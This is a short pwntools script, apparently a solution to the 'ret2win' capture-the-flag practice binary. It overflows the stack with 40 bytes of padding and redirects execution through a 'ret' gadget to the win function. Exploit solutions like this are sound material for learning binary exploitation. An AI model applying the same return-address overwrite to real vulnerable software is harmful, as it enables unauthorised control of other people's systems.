from pwn import *

e = ELF('./ret2win')
p = process('./ret2win')

rop = ROP(e)

ret = rop.find_gadget(['ret'])[0]

padding = b'A' * 40
payload = padding + p64(ret) + p64(e.symbols['ret2win'])

p.sendlineafter(b'> ', payload)
p.interactive()
